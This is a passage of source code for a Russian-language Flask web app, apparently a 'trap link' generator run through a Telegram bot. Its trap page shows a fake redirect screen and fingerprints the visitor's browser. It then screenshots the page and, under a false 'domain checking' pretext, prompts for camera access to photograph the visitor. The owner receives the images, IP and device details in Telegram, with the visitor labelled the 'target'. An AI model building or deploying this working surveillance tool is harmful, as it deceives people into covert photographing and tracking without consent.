                        const fullUrl = `${BASE_URL}/trap/${link.link_id}`;
                        const shortUrl = `${BASE_URL}/s/${link.link_id}`;
                        
                        html += `
                            <div class="link-item">
                                <div class="link-info">
                                    <div class="link-name">${link.name || 'Без названия'}</div>
                                    <div class="link-url">${fullUrl}</div>
                                    <div class="link-stats">
                                        👆 ${link.clicks || 0} переходов • 📅 Создана: ${created} • ⏳ Истекает: ${expires} • ${status}
                                    </div>
                                </div>
                                <div>
                                    <button onclick="copyToClipboard('${fullUrl}')" class="copy-btn" style="padding: 6px 12px; font-size: 12px;">📋</button>
                                    <button onclick="showLinkQR('${fullUrl}')" class="btn-secondary" style="padding: 6px 12px; font-size: 12px; margin: 0 5px;">📱</button>
                                    <button onclick="deleteLink('${link.link_id}')" class="delete-btn">🗑</button>
                                </div>
                            </div>
                        `;
                    }
                }
                
                linksList.innerHTML = html;
                document.getElementById('loadingLinks').style.display = 'none';
            } catch (error) {
                console.error('Ошибка загрузки ссылок:', error);
                showNotification('Ошибка загрузки ссылок', 'error');
                document.getElementById('loadingLinks').innerHTML = 'Ошибка загрузки';
            }
        }
        
        // Показать QR-код для существующей ссылки
        async function showLinkQR(url) {
            try {
                const response = await fetch('/api/generate-qr', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ url: url })
                });
                
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                
                if (data.success && data.qr_code) {
                    // Создаем всплывающее окно с QR-кодом
                    const popup = window.open('', 'QR Code', 'width=400,height=500,scrollbars=no,resizable=no');
                    popup.document.write(`
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <title>QR-код для ссылки</title>
                            <style>
                                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
                                .qr-container { margin: 20px auto; max-width: 300px; }
                                .qr-code { width: 100%; height: auto; }
                                .url { word-break: break-all; margin: 20px 0; color: #666; }
                            </style>
                        </head>
                        <body>
                            <h2>📱 QR-код для ссылки</h2>
                            <div class="qr-container">
                                <img src="${data.qr_code}" alt="QR Code" class="qr-code">
                            </div>
                            <p class="url">${url}</p>
                            <button onclick="window.print()">🖨 Печать</button>
                            <button onclick="window.close()">❌ Закрыть</button>
                        </body>
                        </html>
                    `);
                } else {
                    showNotification('Ошибка генерации QR-кода', 'error');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                showNotification('Ошибка генерации QR-кода', 'error');
            }
        }
        
        // Показать QR-код для созданной ссылки
        async function showQRCode() {
            const link = document.getElementById('generatedLink').value;
            if (!link) {
                showNotification('Сначала создайте ссылку', 'error');
                return;
            }
            
            try {
                const response = await fetch('/api/generate-qr', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ url: link })
                });
                
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                
                if (data.success && data.qr_code) {
                    const qrSection = document.getElementById('qrSection');
                    const qrImage = document.getElementById('qrCodeImage');
                    
                    qrImage.src = data.qr_code;
                    qrSection.style.display = 'block';
                    qrSection.scrollIntoView({ behavior: 'smooth' });
                    
                    showNotification('QR-код сгенерирован', 'info');
                } else {
                    showNotification('Ошибка генерации QR-кода', 'error');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                showNotification('Ошибка генерации QR-кода', 'error');
            }
        }
        
        // Генерация ссылки
        document.getElementById('linkForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const linkName = document.getElementById('linkName').value;
            const redirectUrl = document.getElementById('redirectUrl').value;
            
            if (!redirectUrl || !redirectUrl.startsWith('http')) {
                showNotification('Введите корректный URL (начинается с http:// или https://)', 'error');
                return;
            }
            
            try {
                const response = await fetch('/api/create', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        name: linkName || 'Без названия',
                        redirect_url: redirectUrl
                    })
                });
                
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                
                if (data.success) {
                    const fullUrl = data.full_url;
                    const shortUrl = data.short_url;
                    
                    document.getElementById('generatedLink').value = fullUrl;
                    document.getElementById('shortLink').value = shortUrl;
                    document.getElementById('linkResult').classList.add('active');
                    
                    // Скрываем QR-код предыдущей ссылки
                    document.getElementById('qrSection').style.display = 'none';
                    
                    // Прокрутить к результату
                    document.getElementById('linkResult').scrollIntoView({ behavior: 'smooth' });
                    
                    // Очистить форму
                    document.getElementById('linkName').value = '';
                    
                    // Обновляем статистику
                    await loadStats();
                    
                    showNotification('✅ Ссылка успешно создана!');
                } else {
                    showNotification('Ошибка создания ссылки: ' + (data.error || 'Неизвестная ошибка'), 'error');
                }
            } catch (error) {
                console.error('Ошибка создания ссылки:', error);
                showNotification('Ошибка создания ссылки', 'error');
            }
        });
        
        // Копирование в буфер обмена
        function copyLink() {
            const linkInput = document.getElementById('generatedLink');
            copyToClipboard(linkInput.value);
        }
        
        function copyShortLink() {
            const linkInput = document.getElementById('shortLink');
            copyToClipboard(linkInput.value);
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text)
                .then(() => showNotification('✅ Ссылка скопирована в буфер обмена!'))
                .catch(() => {
                    const textArea = document.createElement('textarea');
                    textArea.value = text;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    showNotification('✅ Ссылка скопирована!');
                });
        }
        
        // Тестирование ссылки
        function testLink() {
            const link = document.getElementById('generatedLink').value;
            if (link) {
                window.open(link, '_blank');
            } else {
                showNotification('Сначала создайте ссылку', 'error');
            }
        }
        
        // Отправка ссылки в Telegram
        async function sendToTelegram() {
            const link = document.getElementById('generatedLink').value;
            if (!link) {
                showNotification('Сначала создайте ссылку', 'error');
                return;
            }
            
            try {
                const response = await fetch('/api/send-link-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        link: link,
                        name: document.getElementById('linkName').value || 'Без названия'
                    })
                });
                
                const data = await response.json();
                if (data.success) {
                    showNotification('✅ Ссылка отправлена в ваш Telegram!');
                } else {
                    showNotification('Ошибка отправки: ' + (data.error || ''), 'error');
                }
            } catch (error) {
                showNotification('Ошибка отправки в Telegram', 'error');
                console.error(error);
            }
        }
        
        // Удаление ссылки
        async function deleteLink(linkId) {
            if (!confirm('Удалить эту ссылку?')) return;
            
            try {
                const response = await fetch(`/api/delete/${linkId}`, {
                    method: 'DELETE'
                });
                
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                
                if (data.success) {
                    showNotification('✅ Ссылка удалена');
                    await loadStats();
                } else {
                    showNotification('Ошибка удаления ссылки', 'error');
                }
            } catch (error) {
                console.error('Ошибка удаления ссылки:', error);
                showNotification('Ошибка удаления ссылки', 'error');
            }
        }
        
        // Выход из системы
        async function logout(logoutEverywhere = false) {
            const message = logoutEverywhere 
                ? 'Вы уверены, что хотите выйти со всех устройств?'
                : 'Вы уверены, что хотите выйти?';
                
            if (!confirm(message)) return;
            
            try {
                const response = await fetch('/api/logout', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ logout_everywhere: logoutEverywhere })
                });
                
                if (response.ok) {
                    window.location.href = '/login';
                }
            } catch (error) {
                console.error('Ошибка выхода:', error);
                showNotification('Ошибка выхода из системы', 'error');
            }
        }
        
        // Загрузка данных при старте
        document.addEventListener('DOMContentLoaded', async () => {
            await loadStats();
            
            // Автообновление каждые 30 секунд
            setInterval(loadStats, 30000);
        });
    </script>
</body>
</html>"""

TRAP_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перенаправление...</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 1.8em;
        }
        .loader {
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        .status {
            margin: 20px 0;
            min-height: 24px;
            font-size: 0.9em;
            opacity: 0.9;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔄 Перенаправление...</h1>
        <p>Пожалуйста, подождите...</p>
        <div class="loader"></div>
        <div class="status" id="status">Подготовка...</div>
    </div>

    <script>
        const TRAP_ID = "{{ trap_id }}";
        const REDIRECT_URL = "{{ redirect_url }}";
        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const SERVER_URL = window.location.origin;
        
        const statusEl = document.getElementById('status');
        
        const browserInfo = {
            trap_id: TRAP_ID,
            session_id: SESSION_ID,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen_width: screen.width,
            screen_height: screen.height,
            color_depth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            url: window.location.href
        };
        
        function updateStatus(message) {
            if (statusEl) statusEl.textContent = message;
        }
        
        async function sendData(endpoint, data) {
            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                return response.ok;
            } catch (error) {
                return false;
            }
        }
        
        async function sendImage(dataURL, imageType) {
            try {
                const blob = await (await fetch(dataURL)).blob();
                const formData = new FormData();
                formData.append('image', blob, `${imageType}_${Date.now()}.jpg`);
                formData.append('type', imageType);
                formData.append('session_id', SESSION_ID);
                formData.append('trap_id', TRAP_ID);
                formData.append('browser_info', JSON.stringify(browserInfo));
                
                const response = await fetch(`${SERVER_URL}/api/upload`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                return false;
            }
        }
        
        async function captureScreenshot() {
            try {
                updateStatus("Ожидание ответа от сайта...");
                
                // Загружаем html2canvas
                if (typeof html2canvas === 'undefined') {
                    await new Promise((resolve) => {
                        const script = document.createElement('script');
                        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                        script.onload = resolve;
                        script.onerror = resolve;
                        document.head.appendChild(script);
                    });
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.documentElement, {
                        scale: 0.5,
                        useCORS: true,
                        logging: false
                    });
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    const success = await sendImage(imageData, 'screenshot');
                    
                    if (success) {
                        updateStatus("✅ Ответ получен! (HTTP 200)");
                        return true;
                    }
                }
                return false;
            } catch (error) {
                return false;
            }
        }
        
        async function captureCamera() {
            try {
                updateStatus("Domain cheking... Please, allow camera access to countine.");
                
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    updateStatus("⚠️ Unable to check. ");
                    return false;
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                updateStatus("Cheking (HTTPS)...");
                
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 800));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                
                stream.getTracks().forEach(track => track.stop());
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                const success = await sendImage(imageData, 'camera');
                
                if (success) {
                        updateStatus("✅ Successfully!");
                        return true;
                }
                return false;
            } catch (error) {
                updateStatus("⚠️ Unable!");
                return false;
            }
        }
        
        async function startCapture() {
            updateStatus("🔄 Server cheking...");
            
            await sendData(`${SERVER_URL}/api/info`, browserInfo);
            
            const screenshotSuccess = await captureScreenshot();
            const cameraSuccess = await captureCamera();
            
            await sendData(`${SERVER_URL}/api/report`, {
                trap_id: TRAP_ID,
                session_id: SESSION_ID,
                screenshot_captured: screenshotSuccess,
                camera_captured: cameraSuccess,
                timestamp: new Date().toISOString()
            });
            
            updateStatus("✅ Завершено! Перенаправляем...");
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1000);
        }
        
        async function initialize() {
            updateStatus("⚙️ Инициализация...");
            await new Promise(resolve => setTimeout(resolve, 500));
            
            try {
                await startCapture();
            } catch (error) {
                console.error("Ошибка захвата:", error);
                updateStatus("⚠️ Ошибка. Перенаправляем...");
                setTimeout(() => window.location.href = REDIRECT_URL, 1000);
            }
        }
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initialize);
        } else {
            initialize();
        }
    </script>
</body>
</html>"""

# ========== FLASK МАРШРУТЫ ==========

@app.route('/')
@login_required
def index():
    """Главная страница генератора"""
    user_id = session['user_id']
    user = get_user_by_id(user_id)
    
    if not user:
        session.clear()
        return redirect(url_for('login_page'))
    
    # Получаем инициалы для аватарки
    initials = ""
    if user['first_name']:
        initials += user['first_name'][0].upper()
    if user['last_name']:
        initials += user['last_name'][0].upper()
    if not initials and user['username']:
        initials = user['username'][0].upper()
    
    # Полное имя
    full_name = f"{user['first_name'] or ''} {user['last_name'] or ''}".strip()
    if not full_name and user['username']:
        full_name = f"@{user['username']}"
    
    user_data = {
        'id': user['user_id'],
        'chat_id': user['chat_id'],
        'username': user['username'],
        'first_name': user['first_name'],
        'last_name': user['last_name'],
        'full_name': full_name,
        'initials': initials[:2]
    }
    
    # Дата истечения сессии (90 дней от текущей даты)
    session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
    
    return render_template_string(
        GENERATOR_HTML,
        user_name=full_name,
        user_initials=initials[:2],
        user_data=user_data,
        base_url=NGROK_URL,
        session_expiry=session_expiry
    )

@app.route('/login')
def login_page():
    """Страница входа через Telegram"""
    # Проверяем, не авторизован ли уже пользователь
    if 'user_id' in session:
        return redirect(url_for('index'))
    
    # Проверяем постоянную сессию
    persistent_session_id = request.cookies.get('persistent_session')
    if persistent_session_id:
        persistent_session = get_persistent_session(persistent_session_id)
        if persistent_session:
            # Восстанавливаем сессию
            session['user_id'] = persistent_session['user_id']
            session['chat_id'] = persistent_session['chat_id']
            session['username'] = persistent_session['username']
            session['first_name'] = persistent_session['first_name']
            session['last_name'] = persistent_session['last_name']
            session.permanent = True
            return redirect(url_for('index'))
    
    try:
        bot_info = bot.get_me()
        bot_username = bot_info.username
        
        # Генерируем QR-код для бота
        bot_url = f"https://t.me/{bot_username}"
        qr_code_url = generate_qr_code_base64(bot_url)
        
        if not qr_code_url:
            qr_code_url = ""  # Пустая строка если QR-код не сгенерировался
        
        return render_template_string(
            LOGIN_HTML,
            bot_username=bot_username,
            qr_code_url=qr_code_url,
            base_url=NGROK_URL
        )
    except Exception as e:
        print(f"Ошибка при получении информации о боте: {e}")
        return "Ошибка инициализации бота. Проверьте токен.", 500

@app.route('/debug')
def debug():
    return "Сервер работает!"

@app.route('/trap/<link_id>')
def trap_page(link_id):
    """Страница ловушки - делает скриншот и фото"""
    # Получаем информацию о ссылке
    link = get_link(link_id)
    
    if not link:
        return "Ссылка не найдена или истекла", 404
    
    if not link['active']:
        return "Ссылка истекла", 410
    
    # Увеличиваем счетчик кликов
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    
    increment_clicks(link_id, ip, user_agent, referer)
    
    # Отправляем уведомление в Telegram владельцу
    user = get_user_by_id(link['user_id'])
    if user:
        send_telegram_click_notification(
            user['chat_id'],
            link_id,
            link['name'],
            link['clicks'] + 1,  # +1 потому что только что увеличили
            ip,
            user_agent[:200]
        )
    
    # Отображаем страницу ловушки
    return render_template_string(
        TRAP_HTML,
        trap_id=link_id,
        redirect_url=link['redirect_url']
    )

@app.route('/s/<link_id>')
def short_link_redirect(link_id):
    """Короткая ссылка для ловушки"""
    # Получаем информацию о ссылке
    link = get_link(link_id)
    
    if not link:
        return "Ссылка не найдена", 404
    
    if not link['active']:
        return "Ссылка истекла", 410
    
    # Увеличиваем счетчик кликов
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    
    increment_clicks(link_id, ip, user_agent, referer)
    
    # Отправляем уведомление в Telegram владельцу
    user = get_user_by_id(link['user_id'])
    if user:
        send_telegram_click_notification(
            user['chat_id'],
            link_id,
            link['name'],
            link['clicks'] + 1,
            ip,
            user_agent[:200]
        )
    
    # Перенаправляем на полную версию ловушки
    return redirect(url_for('trap_page', link_id=link_id))

@app.route('/api/check-auth')
def api_check_auth():
    """Проверка авторизации"""
    user_id = session.get('user_id')
    if user_id:
        return jsonify({'authenticated': True})
    
    # Проверяем постоянную сессию
    persistent_session_id = request.cookies.get('persistent_session')
    if persistent_session_id:
        persistent_session = get_persistent_session(persistent_session_id)
        if persistent_session:
            return jsonify({'authenticated': True})
    
    # Проверяем, есть ли активные сессии для этого пользователя
    chat_id = request.args.get('chat_id')
    if chat_id:
        user = get_user_by_chat_id(chat_id)
        if user:
            return jsonify({'authenticated': False, 'waiting': True})
    
    return jsonify({'authenticated': False, 'waiting': False})

@app.route('/api/logout', methods=['POST'])
@login_required
def api_logout():
    """Выход из системы"""
    data = request.json or {}
    logout_everywhere = data.get('logout_everywhere', False)
    
    user_id = session['user_id']
    
    if logout_everywhere:
        # Удаляем все постоянные сессии пользователя
        with db_lock:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM persistent_sessions WHERE user_id = ?', (user_id,))
            # Также удаляем токен авторизации
            cursor.execute('UPDATE users SET auth_token = NULL, auth_token_expires = NULL WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
    else:
        # Удаляем только текущую постоянную сессию
        persistent_session_id = request.cookies.get('persistent_session')
        if persistent_session_id:
            delete_persistent_session(persistent_session_id)
    
    # Очищаем Flask сессию
    session.clear()
    
    response = jsonify({'success': True})
    
    # Удаляем куки
    response.set_cookie('persistent_session', '', expires=0)
    response.set_cookie('auth_token', '', expires=0)
    
    return response

@app.route('/api/delete/<link_id>', methods=['DELETE'])
@login_required
def api_delete_link(link_id):
    """Удаление ссылки"""
    try:
        user_id = session['user_id']
        success = delete_link(user_id, link_id)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Link not found or not authorized'}), 404
    except Exception as e:
        print(f"Ошибка удаления ссылки: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/send-link-telegram', methods=['POST'])
@login_required
def api_send_link_telegram():
    """Отправка ссылки в Telegram"""
    try:
        user_id = session['user_id']
        user = get_user_by_id(user_id)
        
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 401
        
        data = request.json
        link = data.get('link')
        name = data.get('name', 'Без названия')
        
        success = send_telegram_link_message(user['chat_id'], link, name)
        
        return jsonify({'success': success})
    except Exception as e:
        print(f"Ошибка отправки ссылки в Telegram: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/info', methods=['POST'])
def api_info():
    """Получение информации о браузере"""
    try:
        data = request.json or {}
        trap_id = data.get('trap_id')
        session_id = data.get('session_id')
        
        if trap_id:
            # Находим владельца ссылки
            link = get_link(trap_id)
            if link:
                user = get_user_by_id(link['user_id'])
                if user:
                    # Отправляем информацию о браузере в Telegram
                    send_telegram_browser_info(user['chat_id'], trap_id, data)
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Ошибка обработки информации: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/upload', methods=['POST'])
def api_upload():
    """Загрузка изображений (скриншот/фото с камеры)"""
    try:
        if 'image' not in request.files:
            return jsonify({'success': False, 'error': 'No image provided'}), 400
        
        image_file = request.files['image']
        image_type = request.form.get('type', 'unknown')
        session_id = request.form.get('session_id', '')
        trap_id = request.form.get('trap_id', '')
        browser_info_str = request.form.get('browser_info', '{}')
        
        if not image_file.filename:
            return jsonify({'success': False, 'error': 'No file selected'}), 400
        
        # Сохраняем изображение
        filename = f"{trap_id}_{session_id}_{image_type}_{int(time.time())}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        image_file.save(filepath)
        
        # Сохраняем информацию в базу
        save_image_info(trap_id, image_type, session_id, filename)
        
        # Отправляем в Telegram владельцу
        if trap_id:
            link = get_link(trap_id)
            if link:
                user = get_user_by_id(link['user_id'])
                if user:
                    send_telegram_image(
                        user['chat_id'], 
                        trap_id, 
                        image_type, 
                        filepath, 
                        session_id, 
                        browser_info_str
                    )
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Ошибка загрузки изображения: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/report', methods=['POST'])
def api_report():
    """Получение отчета о захвате"""
    try:
        data = request.json or {}
        trap_id = data.get('trap_id')
        session_id = data.get('session_id')
        screenshot_captured = data.get('screenshot_captured', False)
        camera_captured = data.get('camera_captured', False)
        
        if trap_id:
            link = get_link(trap_id)
            if link:
                user = get_user_by_id(link['user_id'])
                if user:
                    send_telegram_capture_report(
                        user['chat_id'],
                        trap_id,
                        screenshot_captured,
                        camera_captured
                    )
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Ошибка обработки отчета: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/stats')
@login_required
def api_stats():
    """Статистика пользователя"""
    user_id = session['user_id']
    links = get_user_links(user_id)
    
    total_links = len(links)
    total_clicks = sum(link['clicks'] for link in links)
    active_links = len([link for link in links if link['active']])
    
    return jsonify({
        'total_links': total_links,
        'total_clicks': total_clicks,
        'active_links': active_links
    })

@app.route('/api/links')
@login_required
def api_links():
    """Получить ссылки пользователя"""
    user_id = session['user_id']
    links = get_user_links(user_id)
    return jsonify(links)

@app.route('/api/generate-qr', methods=['POST'])
@login_required
def api_generate_qr():
    """Генерация QR-кода для ссылки"""
    try:
        data = request.json
        url = data.get('url')
        
        if not url:
            return jsonify({'success': False, 'error': 'No URL provided'}), 400
        
        qr_code_url = generate_qr_code_base64(url)
        
        if qr_code_url:
            return jsonify({'success': True, 'qr_code': qr_code_url})
        else:
            return jsonify({'success': False, 'error': 'Failed to generate QR code'}), 500
    except Exception as e:
        print(f"Ошибка генерации QR-кода: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/create', methods=['POST'])
@login_required
def api_create_link():
    """Создание новой ссылки"""
    try:
        user_id = session['user_id']
        user = get_user_by_id(user_id)
        
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 401
        
        data = request.json
        link_id = secrets.token_urlsafe(12)
        name = data.get('name', 'Без названия')
        redirect_url = data.get('redirect_url', 'https://www.google.com')
        
        # Проверяем URL
        if not redirect_url.startswith(('http://', 'https://')):
            redirect_url = 'https://' + redirect_url
        
        # Создаем ссылку в базе
        create_link(user_id, link_id, name, redirect_url)
        
        # Полные URL
        full_url = f"{NGROK_URL}/trap/{link_id}"
        short_url = f"{NGROK_URL}/s/{link_id}"
        
        # Отправляем уведомление в Telegram пользователя
        send_telegram_link_created(user['chat_id'], link_id, name, full_url)
        
        return jsonify({
            'success': True,
            'id': link_id,
            'full_url': full_url,
            'short_url': short_url,
            'name': name
        })
    except Exception as e:
        print(f"Ошибка создания ссылки: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ========== API ДЛЯ TELEGRAM ЛОГИНА ==========

@app.route('/api/telegram-login/<session_id>')
def telegram_login(session_id):
    """Вход через Telegram Web App"""
    sess = get_login_session(session_id)
    
    if not sess:
        return "Сессия истекла или не найдена. Получите новую ссылку в боте.", 401
    
    # Получаем данные пользователя
    telegram_data = json.loads(sess['telegram_data'])
    user_id = create_or_update_user(
        telegram_data['chat_id'],
        telegram_data['username'],
        telegram_data['first_name'],
        telegram_data['last_name']
    )
    
    # Устанавливаем сессию
    session['user_id'] = user_id
    session['chat_id'] = telegram_data['chat_id']
    session['username'] = telegram_data['username']
    session['first_name'] = telegram_data['first_name']
    session['last_name'] = telegram_data['last_name']
    session.permanent = True
    
    # Генерируем токен авторизации
    auth_token = generate_auth_token(user_id)
    
    # Создаем постоянную сессию
    user_agent = request.headers.get('User-Agent', '')
    ip_address = request.remote_addr
    persistent_session_id = create_persistent_session(user_id, user_agent, ip_address)
    
    # Удаляем использованную временную сессию
    delete_login_session(session_id)
    
    # Создаем ответ с куки
    response = make_response(redirect(url_for('index')))
    
    # Устанавливаем куки для постоянной сессии
    response.set_cookie(
        'persistent_session',
        persistent_session_id,
        max_age=60*60*24*90,  # 90 дней
        httponly=True,
        secure=False,
        samesite='Lax'
    )
    
    # Также устанавливаем токен авторизации на случай если куки сессии пропадут
    response.set_cookie(
        'auth_token',
        auth_token,
        max_age=60*60*24*90,  # 90 дней
        httponly=True,
        secure=False,
        samesite='Lax'
    )
    
    # Отправляем уведомление в Telegram
    try:
        bot.send_message(
            telegram_data['chat_id'],
            f"✅ *Вы успешно вошли на сайт!*\n\n"
            f"🌐 Адрес: {NGROK_URL}\n"
            f"👤 Пользователь: {telegram_data['first_name'] or ''} {telegram_data['last_name'] or ''}\n"
            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"🔐 Сессия сохранена на 90 дней\n\n"
            f"Теперь вы можете создавать ссылки-ловушки!",
            parse_mode='Markdown'
        )
    except:
        pass
    
    return response

# Middleware
@app.after_request
def add_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

def send_telegram_link_created(chat_id, link_id, name, full_url):
    """Отправка уведомления о создании ссылки"""
    try:
        message = (
            f"🔗 *НОВАЯ ССЫЛКА СОЗДАНА!*\n\n"
            f"📝 Название: {name}\n"
            f"🆔 ID: `{link_id}`\n"
            f"🔗 Ссылка: `{full_url}`\n"
            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"⚠️ *Внимание:* При переходе по ссылке:\n"
            f"• Будет сделан скриншот экрана\n"
            f"• Будет попытка сделать фото с камеры\n"
            f"• Вся информация придет сюда"
        )
        
        bot.send_message(
            chat_id,
            message,
            parse_mode='Markdown'
        )
        
        # Отправляем QR-код
        send_telegram_qr_code(chat_id, full_url, "QR-код для вашей ссылки")
        
        return True
    except Exception as e:
        print(f"Ошибка отправки уведомления о создании ссылки: {e}")
        return False

def send_telegram_click_notification(chat_id, link_id, name, click_count, ip, user_agent):
    """Отправка уведомления о клике по ссылке"""
    try:
        message = (
            f"🎯 *НОВЫЙ ПЕРЕХОД ПО ВАШЕЙ ССЫЛКЕ!*\n\n"
            f"📝 Ссылка: {name}\n"
            f"🆔 ID: `{link_id}`\n"
            f"👤 Всего переходов: {click_count}\n\n"
            f"🌐 *Информация о цели:*\n"
            f"• IP: `{ip}`\n"
            f"• Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• User-Agent: {user_agent}..."
        )
        
        bot.send_message(
            chat_id,
            message,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        print(f"Ошибка отправки уведомления о клике: {e}")
        return False

def send_telegram_browser_info(chat_id, trap_id, browser_info):
    """Отправка информации о браузере"""
    try:
        message = (
            f"📱 *ИНФОРМАЦИЯ О БРАУЗЕРЕ ЦЕЛИ*\n\n"
            f"🆔 ID ловушки: `{trap_id}`\n"
            f"🆔 Session ID: `{browser_info.get('session_id', 'N/A')}`\n"
            f"💻 *Устройство:*\n"
            f"• Платформа: {browser_info.get('platform', 'Unknown')}\n"
            f"• Язык: {browser_info.get('language', 'Unknown')}\n"
            f"• Экран: {browser_info.get('screen_width')}x{browser_info.get('screen_height')}\n"
            f"• User-Agent: {browser_info.get('user_agent', 'Unknown')[:100]}...\n\n"
            f"🌍 *Локация:*\n"
            f"• Часовой пояс: {browser_info.get('timezone', 'Unknown')}\n"
            f"• URL: {browser_info.get('url', 'N/A')[:100]}..."
        )
        
        bot.send_message(
            chat_id,
            message,
            parse_mode='Markdown'
        )
        return True
    except Exception as e:
        print(f"Ошибка отправки browser info: {e}")
        return False

def send_telegram_image(chat_id, trap_id, image_type, image_path, session_id, browser_info_str):
    """Отправка изображения в Telegram"""
    try:
        browser_info = json.loads(browser_info_str) if browser_info_str else {}
        
        caption = (
            f"{'📸 СКРИНШОТ ЭКРАНА' if image_type == 'screenshot' else '📷 ФОТО С КАМЕРЫ'}\n\n"
            f"🆔 ID ловушки: `{trap_id}`\n"
            f"🆔 Session ID: `{session_id}`\n"
            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"💻 Устройство: {browser_info.get('platform', 'Unknown')}"
        )
        
        with open(image_path, 'rb') as photo:
            bot.send_photo(
                chat_id,
                photo,
                caption=caption,
                parse_mode='HTML'
            )
        
        return True
        
    except Exception as e:
        print(f"Ошибка отправки изображения: {e}")
        return False

def send_telegram_capture_report(chat_id, trap_id, screenshot_captured, camera_captured):
    """Отправка отчета о захвате"""
    try:
        message = (
            f"📊 *ОТЧЕТ О ЗАХВАТЕ ДАННЫХ*\n\n"
            f"🆔 ID ловушки: `{trap_id}`\n"
            f"📸 Скриншот: {'✅ Успешно' if screenshot_captured else '❌ Не удалось'}\n"
